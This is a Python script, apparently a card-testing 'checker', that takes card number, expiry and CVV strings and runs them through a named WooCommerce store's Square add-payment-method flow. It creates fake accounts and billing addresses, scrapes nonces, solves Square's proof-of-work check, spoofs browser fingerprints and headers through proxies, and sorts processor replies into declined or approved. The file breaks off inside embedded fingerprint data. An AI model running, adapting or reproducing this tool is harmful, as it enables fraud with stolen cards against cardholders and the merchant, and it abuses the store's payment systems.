import re
import json
import hashlib
import random
import time
import uuid
from browserforge.headers import HeaderGenerator
from datetime import datetime
from faker import Faker
from curl_cffi.requests import AsyncSession

fake = Faker("en_US")

class tools:
    @staticmethod
    def getcard(card: str) -> dict:
        parts = card.split("|")
        cc = parts[0].strip() if len(parts) > 0 else ""
        mm = parts[1].strip() if len(parts) > 1 else ""
        yy = parts[2].strip() if len(parts) > 2 else ""
        cvv = parts[3].strip() if len(parts) > 3 else ""
        
        mm = mm.zfill(2)
        
        if len(yy) == 4:
            yy = yy[-2:]
        elif len(yy) == 2:
            yy = yy
            
        return {"cc": cc, "mm": mm, "yy": yy, "cvv": cvv}


    @staticmethod
    def find_between(s: str, first: str, last: str) -> str | None:
        try:
            return s.split(first, 1)[1].split(last, 1)[0]
        except (IndexError, AttributeError):
            return None

    @staticmethod
    def userdata() -> dict:
        fn = fake.first_name()
        ln = fake.last_name()
        return {
            "name": f"{fn} {ln}",
            "first": fn,
            "last": ln,
            "address": fake.street_address(),
            "city": fake.city(),
            "state": fake.state_abbr(),
            "zip": fake.postcode(),
            "email": f"{fn.lower()}.{ln.lower()}@gmail.com",
            "phone": fake.phone_number(),
        }

    @staticmethod
    def get_card_type(cc_first: str) -> str:
        if not cc_first:
            return "visa"
        return {"3": "american-express", "5": "master-card", "6": "discover"}.get(cc_first[0], "visa")

RESPONSE_MAP = {
    "invalid_card_data": ("Declined", "INVALID_CARD_DATA ❌", False),
    "the provided card data is invalid": ("Declined", "INVALID_CARD_DATA ❌", False),
    "expired_card": ("Declined", "EXPIRED_CARD ❌", False),
    "expiration_failure": ("Declined", "EXPIRED_CARD ❌", False),
    "the card is expired": ("Declined", "EXPIRED_CARD ❌", False),
    "card_declined_verification_required": ("Declined", "CARD_DECLINED_VERIFICATION_REQUIRED ❌", False),
    "card_declined_call_issuer": ("Declined", "CARD_DECLINED_CALL_ISSUER ❌", False),
    "card_declined": ("Declined", "CARD_DECLINED ❌", False),
    "pan_failure": ("Declined", "PAN_FAILURE ❌", False),
    "card number is invalid": ("Declined", "PAN_FAILURE ❌", False),
    "invalid_card": ("Declined", "INVALID_CARD ❌", False),
    "card cannot be validated": ("Declined", "INVALID_CARD ❌", False),
    "unsupported_card_brand": ("Declined", "UNSUPPORTED_CARD_BRAND ❌", False),
    "not from a supported issuer": ("Declined", "UNSUPPORTED_CARD_BRAND ❌", False),
    "cvv_failure": ("Declined", "CVV_FAILURE ❌", False),
    "cvv2_failure": ("Declined", "CVV_FAILURE ❌", False),
    "cvv value is invalid": ("Declined", "CVV_FAILURE ❌", False),
    "address_verification_failure": ("Declined", "ADDRESS_VERIFICATION_FAILURE ❌", False),
    "postal code is invalid": ("Declined", "ADDRESS_VERIFICATION_FAILURE ❌", False),
    "invalid_account": ("Declined", "INVALID_ACCOUNT ❌", False),
    "not able to locate the account": ("Declined", "INVALID_ACCOUNT ❌", False),
    "do_not_honor": ("Declined", "DO_NOT_HONOR ❌", False),
    "account_closed": ("Declined", "ACCOUNT_CLOSED ❌", False),
    "payer_account_locked_or_closed": ("Declined", "PAYER_ACCOUNT_LOCKED_OR_CLOSED ❌", False),
    "lost_or_stolen": ("Declined", "LOST_OR_STOLEN ❌", False),
    "suspected_fraud": ("Declined", "SUSPECTED_FRAUD ❌", False),
    "reattempt_not_permitted": ("Declined", "REATTEMPT_NOT_PERMITTED ❌", False),
    "account_blocked_by_issuer": ("Declined", "ACCOUNT_BLOCKED_BY_ISSUER ❌", False),
    "invalid_or_restricted_card": ("Declined", "INVALID_OR_RESTRICTED_CARD ❌", False),
    "cryptographic_failure": ("Declined", "CRYPTOGRAPHIC_FAILURE ❌", False),
    "declined_please_retry": ("Declined", "DECLINED_PLEASE_RETRY_LATER ❌", False),
    "generic_decline": ("Declined", "GENERIC_DECLINE ❌", False),
    "declined": ("Declined", "DECLINED ❌", False),
    "error": ("Declined", "ERROR ⚠️", False),
    "nice! new payment method": ("Success", "SUCCESS_AUTH ✅", True),
    "card added successfully": ("Success", "SUCCESS_AUTH ✅", True),
    "payment method added": ("Success", "SUCCESS_AUTH ✅", True),
    "card verified": ("Success", "SUCCESS_AUTH ✅", True),
    "true": ("Success", "SUCCESS_GENERIC ✅", True),
    "success": ("Success", "SUCCESS_GENERIC ✅", True),
    "sucsess": ("Success", "SUCCESS_GENERIC ✅", True),
    "approved": ("Success", "SUCCESS_GENERIC ✅", True),
}

class Gateway:
    @staticmethod
    async def charge_card(card_data: dict, user_data: dict, proxies: dict = None) -> tuple[str, str, bool]:
        ua = HeaderGenerator().generate()["User-Agent"]
        sess = str(uuid.uuid4())
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        async with AsyncSession(impersonate="chrome110", proxies=proxies) as session:
            try:
                # 1. GET my-account to get registration nonce
                headers_main = {
                    "referer": "https://www.nancynixrice.com/my-account/edit-address/",
                }
                resp_main = await session.get(
                    "https://www.nancynixrice.com/my-account/",
                    headers=headers_main,
                )
                html = resp_main.text
                reg_nonce = tools.find_between(html, 'name="woocommerce-register-nonce" value="', '"')
                if not reg_nonce:
                    return "Error", "Could not extract registration nonce", False

                # 2. Register new account
                headers_register = {
                    "origin": "https://www.nancynixrice.com",
                    "referer": "https://www.nancynixrice.com/my-account/",
                    "content-type": "application/x-www-form-urlencoded",
                }
                data_register = {
                    "email": user_data["email"],
                    "password": "Williams#123CR7",
                    "wc_order_attribution_source_type": "typein",
                    "wc_order_attribution_referrer": "https://www.nancynixrice.com/my-account/edit-address/",
                    "wc_order_attribution_utm_campaign": "(none)",
                    "wc_order_attribution_utm_source": "(direct)",
                    "wc_order_attribution_utm_medium": "(none)",
                    "wc_order_attribution_utm_content": "(none)",
                    "wc_order_attribution_utm_id": "(none)",
                    "wc_order_attribution_utm_term": "(none)",
                    "wc_order_attribution_utm_source_platform": "(none)",
                    "wc_order_attribution_utm_creative_format": "(none)",
                    "wc_order_attribution_utm_marketing_tactic": "(none)",
                    "wc_order_attribution_session_entry": "https://www.nancynixrice.com/my-account/",
                    "wc_order_attribution_session_start_time": current_time,
                    "wc_order_attribution_session_pages": "2",
                    "wc_order_attribution_session_count": "1",
                    "wc_order_attribution_user_agent": ua,
                    "woocommerce-register-nonce": reg_nonce,
                    "_wp_http_referer": "/my-account/",
                    "register": "Register",
                }
                await session.post(
                    "https://www.nancynixrice.com/my-account/",
                    headers=headers_register,
                    data=data_register,
                )

                # 3. GET edit-address/billing to get address nonce
                headers_address = {
                    "referer": "https://www.nancynixrice.com/my-account/edit-address/",
                }
                resp_address = await session.get(
                    "https://www.nancynixrice.com/my-account/edit-address/billing/",
                    headers=headers_address,
                )
                html_address = resp_address.text
                addr_nonce = tools.find_between(html_address, 'name="woocommerce-edit-address-nonce" value="', '"')
                if not addr_nonce:
                    return "Error", "Could not extract address nonce", False

                # 4. Update billing address
                headers_update = {
                    "origin": "https://www.nancynixrice.com",
                    "referer": "https://www.nancynixrice.com/my-account/edit-address/billing/",
                    "content-type": "application/x-www-form-urlencoded",
                }
                data_update = {
                    "billing_first_name": user_data["first"],
                    "billing_last_name": user_data["last"],
                    "billing_country": "US",
                    "billing_address_1": user_data["address"],
                    "billing_address_2": "",
                    "billing_city": user_data["city"],
                    "billing_state": user_data["state"],
                    "billing_postcode": user_data["zip"],
                    "billing_phone": user_data["phone"],
                    "billing_email": user_data["email"],
                    "save_address": "Save address",
                    "woocommerce-edit-address-nonce": addr_nonce,
                    "_wp_http_referer": "/my-account/edit-address/billing/",
                    "action": "edit_address",
                }
                await session.post(
                    "https://www.nancynixrice.com/my-account/edit-address/billing/",
                    headers=headers_update,
                    data=data_update,
                )

                # 5. GET add-payment-method page to extract Square parameters
                headers_payment = {
                    "referer": "https://www.nancynixrice.com/my-account/payment-methods/",
                }
                resp_payment = await session.get(
                    "https://www.nancynixrice.com/my-account/add-payment-method/",
                    headers=headers_payment,
                )
                html_payment = resp_payment.text
                add_nonce = tools.find_between(html_payment, 'name="woocommerce-add-payment-method-nonce" value="', '"')
                if not add_nonce:
                    return "Error", "Could not extract add-payment-method-nonce", False

                ap = tools.find_between(html_payment, '"application_id":"', '"')
                if not ap:
                    return "Error", "Could not extract application_id", False

                lo = tools.find_between(html_payment, '"location_id":"', '"')
                if not lo:
                    return "Error", "Could not extract location_id", False

                non = tools.find_between(html_payment, '"ajax_should_charge_order_nonce":"', '"')
                if not non:
                    return "Error", "Could not extract ajax_should_charge_order_nonce", False

                # 6. AJAX call to should_charge_order
                headers_ajax = {
                    "origin": "https://www.nancynixrice.com",
                    "referer": "https://www.nancynixrice.com/my-account/add-payment-method/",
                    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "x-requested-with": "XMLHttpRequest",
                }
                data_ajax = {
                    "action": "wc_square_credit_card_should_charge_order",
                    "security": non,
                    "order_id": "0",
                    "is_pay_order": "false",
                }
                await session.post(
                    "https://www.nancynixrice.com/wp-admin/admin-ajax.php",
                    headers=headers_ajax,
                    data=data_ajax,
                )

                # 7. Square hydration
                headers_hydrate = {
                    "origin": "https://web.squarecdn.com",
                    "referer": "https://web.squarecdn.com/",
                    "content-type": "application/json; charset=utf-8",
                }
                params_hydrate = {
                    "applicationId": ap,
                    "hostname": "www.nancynixrice.com",
                    "locationId": lo,
                    "version": "1.83.13",
                }
                resp_hydrate = await session.get(
                    "https://pci-connect.squareup.com/payments/hydrate",
                    params=params_hydrate,
                    headers=headers_hydrate,
                )
                hydrate_json = resp_hydrate.json()
                se = hydrate_json.get("sessionId")
                inn = hydrate_json.get("instanceId")
                if not se or not inn:
                    return "Error", "Hydration failed", False

                # 8. Proof of work
                def compute_hash(input_str):
                    return hashlib.sha256(input_str.encode()).hexdigest()

                def proof_of_work(e, t, r):
                    n = 0
                    while True:
                        if compute_hash(f"{e}:{n}:{','.join(r)}").startswith(t):
                            return n
                        n += 1

                var = proof_of_work(se, "000", [ap, lo, inn])

                # 9. Get card nonce
                headers_nonce = {
                    "origin": "https://web.squarecdn.com",
                    "referer": "https://web.squarecdn.com/",
                    "content-type": "application/json; charset=utf-8",
                }
                params_nonce = {
                    "_": "1784921325301.018",
                    "version": "1.83.13",
                }
                json_nonce = {
                    "analytics": {
                        "fingerprints": [
                            {
                                "components": '{"user_agent":"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36","language":"ar-IQ","resolution":[813,370],"available_resolution":[813,370],"timezone_offset":-180,"open_database":1,"navigator_platform":"Linux armv81","regular_plugins":[],"adblock":false,"touch_support":[5,true,true],"js_fonts":["Arial","Courier","Courier New","Georgia","Helvetica","Monaco","Palatino","Tahoma","Times","Times New Roman","Verdana","Wingdings 2","Wingdings 3"]}',
                                "fingerprint": "bb001e027a776c9a30cd47176e1d93bd",
                                "version": "fingerprint-v1",
                            },
                            {
                                "components": '{"language":"ar-IQ","resolution":[813,370],"available_resolution":[813,370],"timezone_offset":-180,"open_database":1,"navigator_platform":"Linux armv81","regular_plugins":[],"adblock":false,"touch_support":[5,true,true],"js_fonts":["Arial","Courier","Courier New","Georgia","Helvetica","Monaco","Palatino","Tahoma","Times","Times New Roman","Verdana","Wingdings 2","Wingdings 3"]}',
                                "fingerprint": "3d1feca1b6a7fbd76cd945dac4e6eb72",
                                "version": "fingerprint-v1-sans-ua",
                            },
                            {
                                "components": '{"fonts":["sans-serif-thin"],"dom_blockers":[],"font_preferences":{"default":164.71875,"apple":164.71875,"serif":164.71875,"sans":153.65625,"mono":132.625,"min":10.296875,"system":153.65625},"audio":124.08072766105033,"screen_frame":[0,0,0,0],"languages":[["ar-IQ"]],"device_memory":8,"screen_resolution":[813,370],"hardware_concurrency":8,"timezone":"Asia/Baghdad","indexed_db":true,"open_database":true,"platform":"Linux armv81","plugins":[],"canvas":{"winding":true,"geometry":"data:image/png;base64,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","text":"data:image/png;base64,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